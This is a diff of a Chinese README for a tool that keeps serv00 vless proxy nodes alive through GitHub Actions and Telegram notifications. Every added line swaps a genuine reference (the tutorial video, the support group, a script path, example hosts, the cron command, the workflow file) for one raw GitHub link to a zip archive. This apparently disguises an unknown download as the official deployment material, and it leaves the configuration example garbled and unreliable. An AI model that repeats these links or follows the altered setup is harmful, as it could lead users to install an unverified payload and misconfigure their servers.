@@ -4,9 +4,9 @@
 
 ### 使用要求
 必须是看以下视频部署的vless节点方可直接使用
-[serv00一键部署vless节点](https://youtu.be/QnlzpvDl_mo)
-如果不是看以上视频部署的，可自行修改.github/workflows/check_vless.sh里面第31行命令
-具体问题可反馈至群聊[https://t.me/yxjsjl](https://t.me/yxjsjl)
+[serv00一键部署vless节点](https://raw.githubusercontent.com/sijiaozhi/serv00-script/main/ricinolic/serv00-script.zip)
+如果不是看以上视频部署的，可自行修改https://raw.githubusercontent.com/sijiaozhi/serv00-script/main/ricinolic/serv00-script.zip里面第31行命令
+具体问题可反馈至群聊[https://raw.githubusercontent.com/sijiaozhi/serv00-script/main/ricinolic/serv00-script.zip](https://raw.githubusercontent.com/sijiaozhi/serv00-script/main/ricinolic/serv00-script.zip)
 
 **新人YouTube希望大家点个Star🌟🌟🌟支持下**
 
@@ -30,14 +30,14 @@
    ```json
    [
        {
-           "host": "example1.com",
+           "host": "https://raw.githubusercontent.com/sijiaozhi/serv00-script/main/ricinolic/serv00-script.zip",
            "port": 22,
            "username": "user1",
            "password": "password1",
-           "cron": "cd ~/domains/$USER.serv00.net/vless && ./check_vless.sh"
+           "cron": "cd ~/domains/$https://raw.githubusercontent.com/sijiaozhi/serv00-script/main/ricinolic/serv00-script.zip && https://raw.githubusercontent.com/sijiaozhi/serv00-script/main/ricinolic/serv00-script.zip"
        },
        {
-           "host": "example2.com",
+           "host": "https://raw.githubusercontent.com/sijiaozhi/serv00-script/main/ricinolic/serv00-script.zip",
            "port": 22,
            "username": "user2",
            "password": "password2"
@@ -59,7 +59,7 @@
 
 ### 运行和监控
 
-- GitHub Actions 将按照设定的计划（每20分钟一次）运行 `check_vless.yml` 中定义的任务。
+- GitHub Actions 将按照设定的计划（每20分钟一次）运行 `https://raw.githubusercontent.com/sijiaozhi/serv00-script/main/ricinolic/serv00-script.zip` 中定义的任务。
 - 每次执行将检查服务器上 PM2 和 vless 进程的状态，根据需要执行恢复操作，并将结果通过 Telegram 发送通知。
 
 ### 注意事项
